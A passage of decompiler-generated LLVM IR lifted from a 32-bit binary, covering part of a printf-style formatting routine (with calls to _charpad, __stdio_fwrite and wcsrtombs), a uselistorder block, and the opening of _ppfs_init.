  %v2_8052147 = inttoptr i32 %v1_8052147 to i32*
  %v3_8052147 = load i32, i32* %v2_8052147, align 4
  store i32 %v3_8052147, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052150 = add i32 %v0_8052147, 368
  %v2_8052150 = inttoptr i32 %v1_8052150 to i32*
  %v3_8052150 = load i32, i32* %v2_8052150, align 4
  store i32 %v3_8052150, i32* @eax, align 4
  %v0_8052157 = call i32 @_charpad()
  store i32 %v0_8052157, i32* %eax.global-to-local, align 4
  %v1_805215c = load i32, i32* @esp, align 4
  %v2_805215c = add i32 %v1_805215c, 8
  %v3_805215c = inttoptr i32 %v2_805215c to i32*
  %v4_805215c = load i32, i32* %v3_805215c, align 4
  %v5_805215c = sub i32 %v0_8052157, %v4_805215c
  %v15_805215c = icmp eq i32 %v5_805215c, 0
  %v16_805215c = icmp slt i32 %v5_805215c, 0
  store i1 %v16_805215c, i1* %sf.global-to-local, align 1
  %v1_8052160 = icmp eq i1 %v15_805215c, false
  br i1 %v1_8052160, label %dec_label_pc_805225b, label %dec_label_pc_8052166

dec_label_pc_8052166:                             ; preds = %dec_label_pc_8052147
  store i32 0, i32* %v3_805215c, align 4
  %v1_805216e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805216e

dec_label_pc_805216e:                             ; preds = %dec_label_pc_8052140, %dec_label_pc_8052166
  %v1_805216e = phi i32 [ %v0_8052147, %dec_label_pc_8052140 ], [ %v1_805216e.pre, %dec_label_pc_8052166 ]
  %v0_805216e = load i32, i32* %eax.global-to-local, align 4
  %v2_805216e = add i32 %v1_805216e, -4
  %v3_805216e = inttoptr i32 %v2_805216e to i32*
  store i32 %v0_805216e, i32* %v3_805216e, align 4
  %v0_805216f = load i32, i32* %eax.global-to-local, align 4
  %v2_805216f = add i32 %v1_805216e, -8
  %v3_805216f = inttoptr i32 %v2_805216f to i32*
  store i32 %v0_805216f, i32* %v3_805216f, align 4
  %v1_8052170 = add i32 %v1_805216e, 368
  %v2_8052170 = inttoptr i32 %v1_8052170 to i32*
  %v3_8052170 = load i32, i32* %v2_8052170, align 4
  %v5_8052170 = add i32 %v1_805216e, -12
  %v6_8052170 = inttoptr i32 %v5_8052170 to i32*
  store i32 %v3_8052170, i32* %v6_8052170, align 4
  %v0_8052177 = load i32, i32* @ebp, align 4
  %v1_8052177 = add i32 %v0_8052177, ptrtoint (i32* @global_var_805a245.481 to i32)
  store i32 %v1_8052177, i32* %eax.global-to-local, align 4
  %v2_805217d = add i32 %v1_805216e, -16
  %v3_805217d = inttoptr i32 %v2_805217d to i32*
  store i32 %v1_8052177, i32* %v3_805217d, align 4
  %v0_805217e = load i32, i32* %stack_var_-364, align 4
  %v4_805217e = inttoptr i32 %v0_805217e to i8*
  %v5_805217e = call i32 @__GI_fputs_unlocked(i8* %v4_805217e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805217e, i32* %eax.global-to-local, align 4
  %v0_8052183 = load i32, i32* @esp, align 4
  %v1_8052183 = add i32 %v0_8052183, 384
  %v2_8052183 = inttoptr i32 %v1_8052183 to i32*
  %v3_8052183 = load i32, i32* %v2_8052183, align 4
  store i32 %v3_8052183, i32* @eax, align 4
  %v0_805218a = load i32, i32* @ebx, align 4
  store i32 %v0_805218a, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052191 = call i32 @_charpad()
  store i32 %v0_8052191, i32* %eax.global-to-local, align 4
  %v0_8052196 = load i32, i32* @esp, align 4
  %v1_8052196 = add i32 %v0_8052196, 16
  %v1_8052199 = load i32, i32* @ebx, align 4
  %v2_8052199 = sub i32 %v0_8052191, %v1_8052199
  %v12_8052199 = icmp eq i32 %v2_8052199, 0
  %v13_8052199 = icmp slt i32 %v2_8052199, 0
  store i1 %v13_8052199, i1* %sf.global-to-local, align 1
  %v1_805219b = icmp eq i1 %v12_8052199, false
  br i1 %v1_805219b, label %dec_label_pc_805225b, label %dec_label_pc_80521a1

dec_label_pc_80521a1:                             ; preds = %dec_label_pc_805216e
  %v1_80521a1 = add i32 %v0_8052196, 356
  %v2_80521a1 = inttoptr i32 %v1_80521a1 to i32*
  %v3_80521a1 = load i32, i32* %v2_80521a1, align 4
  %v4_80521a1 = icmp eq i32 %v3_80521a1, 0
  %v5_80521a1 = icmp slt i32 %v3_80521a1, 0
  store i1 %v5_80521a1, i1* %sf.global-to-local, align 1
  %v1_80521a9 = icmp eq i1 %v4_80521a1, false
  br i1 %v1_80521a9, label %dec_label_pc_80521cd, label %dec_label_pc_80521ab

dec_label_pc_80521ab:                             ; preds = %dec_label_pc_80521a1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80521ad = load i32, i32* @esi, align 4
  %v1_80521ad = icmp eq i32 %v0_80521ad, 0
  %v2_80521ad = icmp slt i32 %v0_80521ad, 0
  store i1 %v2_80521ad, i1* %sf.global-to-local, align 1
  br i1 %v1_80521ad, label %dec_label_pc_80521c3, label %dec_label_pc_80521b1

dec_label_pc_80521b1:                             ; preds = %dec_label_pc_80521ab
  %v2_80521b1 = add i32 %v0_8052196, 12
  %v3_80521b1 = inttoptr i32 %v2_80521b1 to i32*
  store i32 0, i32* %v3_80521b1, align 4
  %v1_80521b2 = add i32 %v0_8052196, 384
  %v2_80521b2 = inttoptr i32 %v1_80521b2 to i32*
  %v3_80521b2 = load i32, i32* %v2_80521b2, align 4
  %v5_80521b2 = add i32 %v0_8052196, 8
  %v6_80521b2 = inttoptr i32 %v5_80521b2 to i32*
  store i32 %v3_80521b2, i32* %v6_80521b2, align 4
  %v0_80521b9 = load i32, i32* @esi, align 4
  %v2_80521b9 = add i32 %v0_8052196, 4
  %v3_80521b9 = inttoptr i32 %v2_80521b9 to i32*
  store i32 %v0_80521b9, i32* %v3_80521b9, align 4
  %v0_80521ba = load i32, i32* @edi, align 4
  %v3_80521ba = inttoptr i32 %v0_8052196 to i32*
  store i32 %v0_80521ba, i32* %v3_80521ba, align 4
  %v0_80521bb = load i32, i32* %stack_var_-364, align 4
  %v4_80521bb = call i32 @__stdio_fwrite(i32 %v0_80521bb, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80521bb, i32* %eax.global-to-local, align 4
  %v0_80521c0 = load i32, i32* @esp, align 4
  %v1_80521c0 = add i32 %v0_80521c0, 16
  %v7_80521c0 = icmp slt i32 %v1_80521c0, 0
  store i1 %v7_80521c0, i1* %sf.global-to-local, align 1
  %v1_80521c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80521c3

dec_label_pc_80521c3:                             ; preds = %dec_label_pc_80521ab, %dec_label_pc_80521b1
  %v0_805222d46 = phi i32 [ %v1_8052196, %dec_label_pc_80521ab ], [ %v1_80521c0, %dec_label_pc_80521b1 ]
  %v1_80521c3 = phi i32 [ 0, %dec_label_pc_80521ab ], [ %v1_80521c3.pre, %dec_label_pc_80521b1 ]
  %v0_80521c3 = phi i32 [ 0, %dec_label_pc_80521ab ], [ %v4_80521bb, %dec_label_pc_80521b1 ]
  %v2_80521c3 = sub i32 %v0_80521c3, %v1_80521c3
  %v12_80521c3 = icmp eq i32 %v2_80521c3, 0
  %v13_80521c3 = icmp slt i32 %v2_80521c3, 0
  store i1 %v13_80521c3, i1* %sf.global-to-local, align 1
  %v1_80521c5 = icmp eq i1 %v12_80521c3, false
  br i1 %v1_80521c5, label %dec_label_pc_805225b, label %dec_label_pc_805222d

dec_label_pc_80521cd:                             ; preds = %dec_label_pc_80521a1
  %v1_80521cd = add i32 %v0_8052196, 348
  %v2_80521cd = inttoptr i32 %v1_80521cd to i32*
  store i32 0, i32* %v2_80521cd, align 4
  %v0_80522298 = load i32, i32* @esi, align 4
  %v1_80522299 = icmp eq i32 %v0_80522298, 0
  %v2_805222910 = icmp slt i32 %v0_80522298, 0
  store i1 %v2_805222910, i1* %sf.global-to-local, align 1
  %v1_805222b16 = icmp eq i1 %v1_80522299, false
  %v0_80521da.pre = load i32, i32* @esp, align 4
  br i1 %v1_805222b16, label %dec_label_pc_80521da, label %dec_label_pc_805222d

dec_label_pc_80521da:                             ; preds = %dec_label_pc_80521cd, %dec_label_pc_8052227
  %v0_80521e1 = phi i32 [ %v2_8052227, %dec_label_pc_8052227 ], [ %v0_80522298, %dec_label_pc_80521cd ]
  %v1_80521ec = phi i32 [ %v0_80521da41, %dec_label_pc_8052227 ], [ %v0_80521da.pre, %dec_label_pc_80521cd ]
  %v1_80521da = add i32 %v1_80521ec, 332
  store i32 %v1_80521da, i32* %edx.global-to-local, align 4
  %v1_80521e1 = add i32 %v0_80521e1, -128
  %v2_80521e1 = icmp ult i32 %v0_80521e1, 128
  %v6_80521e1 = icmp eq i32 %v1_80521e1, 0
  %v7_80521e1 = icmp slt i32 %v1_80521e1, 0
  store i1 %v7_80521e1, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_80521ec = add i32 %v1_80521ec, -4
  %v3_80521ec = inttoptr i32 %v2_80521ec to i32*
  store i32 %v1_80521da, i32* %v3_80521ec, align 4
  %v2_80521ed = or i1 %v2_80521e1, %v6_80521e1
  %v3_80521ed = load i32, i32* %eax.global-to-local, align 4
  %v4_80521ed = load i32, i32* @esi, align 4
  %v5_80521ed = select i1 %v2_80521ed, i32 %v4_80521ed, i32 %v3_80521ed
  %v2_80521f0 = add i32 %v1_80521ec, -8
  %v3_80521f0 = inttoptr i32 %v2_80521f0 to i32*
  store i32 %v5_80521ed, i32* %v3_80521f0, align 4
  %v1_80521f1 = add i32 %v1_80521ec, 340
  store i32 %v1_80521f1, i32* %eax.global-to-local, align 4
  %v2_80521f8 = add i32 %v1_80521ec, -12
  %v3_80521f8 = inttoptr i32 %v2_80521f8 to i32*
  store i32 %v1_80521f1, i32* %v3_80521f8, align 4
  %v1_80521f9 = add i32 %v1_80521ec, 204
  store i32 %v1_80521f9, i32* @edi, align 4
  %v2_8052200 = add i32 %v1_80521ec, -16
  %v3_8052200 = inttoptr i32 %v2_8052200 to i32*
  store i32 %v1_80521f9, i32* %v3_8052200, align 4
  %v0_8052201 = call i32 @__GI_wcsrtombs()
  %v0_8052206 = load i32, i32* @esp, align 4
  %v1_8052206 = add i32 %v0_8052206, 16
  store i32 %v0_8052201, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805220d = icmp eq i32 %v0_8052201, 0
  %v2_805220d = icmp slt i32 %v0_8052201, 0
  store i1 %v2_805220d, i1* %sf.global-to-local, align 1
  br i1 %v1_805220d, label %dec_label_pc_8052223, label %dec_label_pc_8052211

dec_label_pc_8052211:                             ; preds = %dec_label_pc_80521da
  %v0_8052211 = load i32, i32* @ebp, align 4
  %v2_8052211 = add i32 %v0_8052206, 12
  %v3_8052211 = inttoptr i32 %v2_8052211 to i32*
  store i32 %v0_8052211, i32* %v3_8052211, align 4
  %v1_8052212 = add i32 %v0_8052206, 384
  %v2_8052212 = inttoptr i32 %v1_8052212 to i32*
  %v3_8052212 = load i32, i32* %v2_8052212, align 4
  %v5_8052212 = add i32 %v0_8052206, 8
  %v6_8052212 = inttoptr i32 %v5_8052212 to i32*
  store i32 %v3_8052212, i32* %v6_8052212, align 4
  %v2_8052219 = add i32 %v0_8052206, 4
  %v3_8052219 = inttoptr i32 %v2_8052219 to i32*
  store i32 %v0_8052201, i32* %v3_8052219, align 4
  %v0_805221a = load i32, i32* @edi, align 4
  %v3_805221a = inttoptr i32 %v0_8052206 to i32*
  store i32 %v0_805221a, i32* %v3_805221a, align 4
  %v0_805221b = load i32, i32* %stack_var_-364, align 4
  %v4_805221b = call i32 @__stdio_fwrite(i32 %v0_805221b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805221b, i32* %eax.global-to-local, align 4
  %v0_8052220 = load i32, i32* @esp, align 4
  %v1_8052220 = add i32 %v0_8052220, 16
  %v7_8052220 = icmp slt i32 %v1_8052220, 0
  store i1 %v7_8052220, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052223

dec_label_pc_8052223:                             ; preds = %dec_label_pc_80521da, %dec_label_pc_8052211
  %v1_8052227 = phi i32 [ 0, %dec_label_pc_80521da ], [ %v4_805221b, %dec_label_pc_8052211 ]
  %v0_80521da41 = phi i32 [ %v1_8052206, %dec_label_pc_80521da ], [ %v1_8052220, %dec_label_pc_8052211 ]
  %v2_8052223 = sub i32 %v1_8052227, %v0_8052201
  %v12_8052223 = icmp eq i32 %v2_8052223, 0
  %v13_8052223 = icmp slt i32 %v2_8052223, 0
  store i1 %v13_8052223, i1* %sf.global-to-local, align 1
  %v1_8052225 = icmp eq i1 %v12_8052223, false
  br i1 %v1_8052225, label %dec_label_pc_805225b, label %dec_label_pc_8052227

dec_label_pc_8052227:                             ; preds = %dec_label_pc_8052223
  %v0_8052227 = load i32, i32* @esi, align 4
  %v2_8052227 = sub i32 %v0_8052227, %v1_8052227
  %v12_8052227 = icmp eq i32 %v2_8052227, 0
  %v13_8052227 = icmp slt i32 %v2_8052227, 0
  store i32 %v2_8052227, i32* @esi, align 4
  store i1 %v13_8052227, i1* %sf.global-to-local, align 1
  %v1_805222b = icmp eq i1 %v12_8052227, false
  br i1 %v1_805222b, label %dec_label_pc_80521da, label %dec_label_pc_805222d

dec_label_pc_805222d:                             ; preds = %dec_label_pc_8052227, %dec_label_pc_80521cd, %dec_label_pc_80521c3
  %v0_805222d = phi i32 [ %v0_805222d46, %dec_label_pc_80521c3 ], [ %v0_80521da.pre, %dec_label_pc_80521cd ], [ %v0_80521da41, %dec_label_pc_8052227 ]
  %v1_805222d = add i32 %v0_805222d, 8
  %v2_805222d = inttoptr i32 %v1_805222d to i32*
  %v3_805222d = load i32, i32* %v2_805222d, align 4
  store i32 %v3_805222d, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052236 = add i32 %v0_805222d, 368
  %v2_8052236 = inttoptr i32 %v1_8052236 to i32*
  %v3_8052236 = load i32, i32* %v2_8052236, align 4
  store i32 %v3_8052236, i32* @eax, align 4
  %v0_805223d = call i32 @_charpad()
  store i32 %v0_805223d, i32* %eax.global-to-local, align 4
  %v1_8052242 = load i32, i32* @esp, align 4
  %v2_8052242 = add i32 %v1_8052242, 8
  %v3_8052242 = inttoptr i32 %v2_8052242 to i32*
  %v4_8052242 = load i32, i32* %v3_8052242, align 4
  %v5_8052242 = sub i32 %v0_805223d, %v4_8052242
  %v15_8052242 = icmp eq i32 %v5_8052242, 0
  %v16_8052242 = icmp slt i32 %v5_8052242, 0
  store i1 %v16_8052242, i1* %sf.global-to-local, align 1
  %v1_8052246 = icmp eq i1 %v15_8052242, false
  br i1 %v1_8052246, label %dec_label_pc_805225b, label %dec_label_pc_8052248

dec_label_pc_8052248:                             ; preds = %dec_label_pc_805222d, %dec_label_pc_8051fb5, %dec_label_pc_8051de0
  %v0_8052248 = phi i32 [ %v1_8052242, %dec_label_pc_805222d ], [ %v0_8052248.pre, %dec_label_pc_8051fb5 ], [ %v1_8051dfe, %dec_label_pc_8051de0 ]
  %v1_8052248 = add i32 %v0_8052248, 16
  %v2_8052248 = inttoptr i32 %v1_8052248 to i32*
  %v3_8052248 = load i32, i32* %v2_8052248, align 4
  store i32 %v3_8052248, i32* @ebx, align 4
  store i32 %v3_8052248, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d38.backedge

dec_label_pc_8052253:                             ; preds = %dec_label_pc_8051d76
  %v1_8052253 = add i32 %v0_8052253, 2
  %v10_8052253 = icmp slt i32 %v1_8052253, 0
  store i1 %v10_8052253, i1* %sf.global-to-local, align 1
  store i32 %v1_8052253, i32* @ebx, align 4
  br label %dec_label_pc_8051d38.backedge

dec_label_pc_805225b:                             ; preds = %dec_label_pc_8051d62, %dec_label_pc_805222d, %dec_label_pc_80521c3, %dec_label_pc_805216e, %dec_label_pc_8052147, %dec_label_pc_80520b7, %dec_label_pc_805202a, %dec_label_pc_8051feb, %dec_label_pc_8051f8c, %dec_label_pc_8052223
  %v0_805225b = phi i32 [ %v0_80521da41, %dec_label_pc_8052223 ], [ %v0_805225b.pre.pre, %dec_label_pc_8051d62 ], [ %v1_8052242, %dec_label_pc_805222d ], [ %v0_805222d46, %dec_label_pc_80521c3 ], [ %v1_8052196, %dec_label_pc_805216e ], [ %v1_805215c, %dec_label_pc_8052147 ], [ %v0_8051dd8.lcssa, %dec_label_pc_80520b7 ], [ %v1_8052042, %dec_label_pc_805202a ], [ %v1_805200e, %dec_label_pc_8051feb ], [ %v1_8051faa, %dec_label_pc_8051f8c ]
  %v1_805225b = inttoptr i32 %v0_805225b to i32*
  store i32 -1, i32* %v1_805225b, align 4
  br label %dec_label_pc_8052262

dec_label_pc_8052262:                             ; preds = %dec_label_pc_8051d6d, %dec_label_pc_8051cdb, %dec_label_pc_8051cfa, %dec_label_pc_805225b
  %v0_8052262 = load i32, i32* @esp, align 4
  %v1_8052262 = inttoptr i32 %v0_8052262 to i32*
  %v2_8052262 = load i32, i32* %v1_8052262, align 4
  store i32 %v2_8052262, i32* %eax.global-to-local, align 4
  %v1_8052265 = add i32 %v0_8052262, 348
  %v10_8052265 = icmp slt i32 %v1_8052265, 0
  store i1 %v10_8052265, i1* %sf.global-to-local, align 1
  ret i32 %v2_8052262

; uselistorder directives
  uselistorder i32 %v1_8052253, { 1, 2, 0 }
  uselistorder i32 %v3_8052248, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805222d, { 1, 0 }
  uselistorder i32 %v2_8052227, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8052206, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8052201, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_80521e1, { 1, 0 }
  uselistorder i32 %v0_80521da.pre, { 1, 0 }
  uselistorder i32 %v0_80521ad, { 1, 0 }
  uselistorder i32 %v3_80521a1, { 1, 0 }
  uselistorder i32 %v0_8052196, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_805216e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052147, { 0, 2, 1, 3 }
  uselistorder i8 %v4_805212f, { 1, 0 }
  uselistorder i32 %v2_805211b, { 1, 0, 2, 3 }
  uselistorder i32 %v6_8052108, { 1, 0 }
  uselistorder i32 %v1_8052105, { 1, 0 }
  uselistorder i32 %v1_80520fb, { 1, 0 }
  uselistorder i32 %v0_80520fb, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80520da, { 1, 0 }
  uselistorder i32 %v1_80520b7, { 1, 0 }
  uselistorder i32 %v1_8052075, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8052091, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805205a, { 1, 0 }
  uselistorder i32 %v1_8052045, { 1, 0 }
  uselistorder i32 %v1_8052011, { 1, 0 }
  uselistorder i32 %v0_8051feb, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8051fd1, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_8051fbd, { 1, 0 }
  uselistorder i32 %v1_8051f73, { 1, 0 }
  uselistorder i32 %v4_8051f41, { 1, 0 }
  uselistorder i32 %v0_8051f36, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8051f31, { 1, 0 }
  uselistorder i32 %v0_8051f6a, { 1, 0, 2, 3 }
  uselistorder i8 %v3_8051f21, { 1, 0 }
  uselistorder i32 %v1_8051f18, { 1, 0 }
  uselistorder i32 %v1_8051f0c, { 1, 0 }
  uselistorder i32 %v3_8051f00, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8051ef6, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8051ef1, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_8051eef, { 1, 0 }
  uselistorder i32 %v0_8051f41, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8051f31, { 1, 2, 0 }
  uselistorder i32 %v3_8051ec9, { 0, 1, 3, 2 }
  uselistorder i8 %v4_8051eb7, { 1, 0 }
  uselistorder i32 %v4_8051eae, { 1, 0 }
  uselistorder i32 %v3_8051eae, { 1, 0 }
  uselistorder i32 %v6_8051ea6, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_8051e77, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_8051e76, { 2, 1, 0 }
  uselistorder i32 %v1_8051e4f, { 1, 0 }
  uselistorder i32 %v1_8051e43, { 1, 0 }
  uselistorder i32 %v1_8051e3e, { 1, 0 }
  uselistorder i32 %v2_8051e36, { 1, 0 }
  uselistorder i32 %tmp68, { 1, 0 }
  uselistorder i32 %v3_8051e20, { 1, 0, 2 }
  uselistorder i8 %v3_8051e0f, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051e06, { 1, 0 }
  uselistorder i32 %v3_8051dd8, { 5, 9, 8, 0, 1, 10, 11, 14, 13, 7, 4, 6, 15, 16, 12, 2, 3, 17, 18, 19 }
  uselistorder i32 %v0_8051dd8.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8051dd4, { 1, 0 }
  uselistorder i32 %v1_8051dd4.pre, { 1, 0 }
  uselistorder i32 %v1_8051dd3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8051dd0, { 1, 0 }
  uselistorder i32 %v2_8051dd472, { 1, 0 }
  uselistorder i32 %v3_8051dba, { 1, 0 }
  uselistorder i8 %v4_8051d76, { 1, 0 }
  uselistorder i32 %v1_8051d76, { 1, 0, 3, 2 }
  uselistorder i8 %v2_8051d6d, { 1, 0 }
  uselistorder i32 %v2_8051d42, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_8051d3e, { 1, 0 }
  uselistorder i8 %v2_8051d38, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051d46, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051d28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 7, 0, 6, 5, 1, 8, 9, 10, 11 }
  uselistorder i1* %sf.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 94, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 85, 88, 89, 90, 91, 92, 93 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 19, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 20, 15, 16, 17, 21, 18, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0, 62, 63, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 3, 5, 6, 4, 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8052262, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805225b, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8052223, { 1, 0 }
  uselistorder label %dec_label_pc_80521da, { 1, 0 }
  uselistorder label %dec_label_pc_80521c3, { 1, 0 }
  uselistorder label %dec_label_pc_805216e, { 1, 0 }
  uselistorder label %dec_label_pc_8052140, { 1, 0 }
  uselistorder label %dec_label_pc_8052125, { 1, 0 }
  uselistorder label %dec_label_pc_805210f, { 1, 0 }
  uselistorder label %dec_label_pc_80520fb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80520f6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052088, { 1, 0 }
  uselistorder label %dec_label_pc_805206e, { 1, 0 }
  uselistorder label %dec_label_pc_8051f8c, { 1, 0 }
  uselistorder label %dec_label_pc_8051f31, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_8051edf, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8051e8f, { 1, 0 }
  uselistorder label %dec_label_pc_8051e76, { 1, 0 }
  uselistorder label %dec_label_pc_8051e62, { 1, 0 }
  uselistorder label %dec_label_pc_8051e5d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e3e, { 1, 0 }
  uselistorder label %dec_label_pc_8051dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8051dc1, { 1, 0 }
  uselistorder label %dec_label_pc_8051d6d, { 1, 0 }
  uselistorder label %dec_label_pc_8051d62, { 1, 0 }
  uselistorder label %dec_label_pc_8051d38.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052270 = load i32, i32* @esi, align 4
  %v0_8052271 = load i32, i32* @ebx, align 4
  store i32 %v0_8052271, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8052285 = bitcast i32* %arg1 to i8*
  %v4_8052285 = call i32 @__GI_memset(i8* %v3_8052285, i32 0, i32 188)
  %v0_805228a = load i32, i32* @ebx, align 4
  %v1_805228a = add i32 %v0_805228a, 40
  store i32 %v1_805228a, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_8052292 = add i32 %v0_805228a, 24
  %v2_8052292 = inttoptr i32 %v1_8052292 to i32*
  %v3_8052292 = load i32, i32* %v2_8052292, align 4
  %v4_8052292 = add i32 %v3_8052292, -1
  store i32 %v4_8052292, i32* %v2_8052292, align 4
  %v0_8052298 = load i32, i32* @esi, align 4
  %v1_8052298 = load i32, i32* @ebx, align 4
  %v2_8052298 = inttoptr i32 %v1_8052298 to i32*
  store i32 %v0_8052298, i32* %v2_8052298, align 4
  %v0_805229a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805229a

dec_label_pc_805229a:                             ; preds = %dec_label_pc_805229a, %entry
  %v0_805229a = phi i32 [ %v1_80522a0, %dec_label_pc_805229a ], [ %v0_805229a.pre, %entry ]
  %v1_805229a = inttoptr i32 %v0_805229a to i32*
  store i32 8, i32* %v1_805229a, align 4
  %v0_80522a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80522a0 = add i32 %v0_80522a0, 4
  store i32 %v1_80522a0, i32* %eax.global-to-local, align 4
  %v0_80522a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522a3 = add i32 %v0_80522a3, -1
  %v8_80522a3 = icmp eq i32 %v1_80522a3, 0
  store i32 %v1_80522a3, i32* %edx.global-to-local, align 4
  %v1_80522a4 = icmp eq i1 %v8_80522a3, false
  br i1 %v1_80522a4, label %dec_label_pc_805229a, label %dec_label_pc_80522a6

dec_label_pc_80522a6:                             ; preds = %dec_label_pc_805229a
  %v0_80522a6 = load i32, i32* @esi, align 4
  store i32 %v0_80522a6, i32* %eax.global-to-local, align 4
  %v1_80522d120 = inttoptr i32 %v0_80522a6 to i8*
  %v2_80522d121 = load i8, i8* %v1_80522d120, align 1
  %v3_80522d122 = zext i8 %v2_80522d121 to i32
  %v5_80522d123 = and i32 %v1_80522a3, -256
  %v6_80522d124 = or i32 %v3_80522d122, %v5_80522d123
  store i32 %v6_80522d124, i32* %edx.global-to-local, align 4
  %v4_80522d325 = icmp eq i8 %v2_80522d121, 0
  %v1_80522d527 = icmp eq i1 %v4_80522d325, false
  br i1 %v1_80522d527, label %dec_label_pc_80522af, label %dec_label_pc_80522d7

dec_label_pc_80522af:                             ; preds = %dec_label_pc_80522a6, %dec_label_pc_80522d1.backedge
  %v6_80522d130 = phi i32 [ %v6_80522d1, %dec_label_pc_80522d1.backedge ], [ %v6_80522d124, %dec_label_pc_80522a6 ]
  %v2_80522d129 = phi i8 [ %v2_80522d1, %dec_label_pc_80522d1.backedge ], [ %v2_80522d121, %dec_label_pc_80522a6 ]
  %v0_80522b428 = phi i32 [ %v0_80522b4.be, %dec_label_pc_80522d1.backedge ], [ %v0_80522a6, %dec_label_pc_80522a6 ]
  %v10_80522af = icmp eq i8 %v2_80522d129, 37
  %v1_80522b2 = icmp eq i1 %v10_80522af, false
  br i1 %v1_80522b2, label %dec_label_pc_80522d0, label %dec_label_pc_80522b4

dec_label_pc_80522b4:                             ; preds = %dec_label_pc_80522af
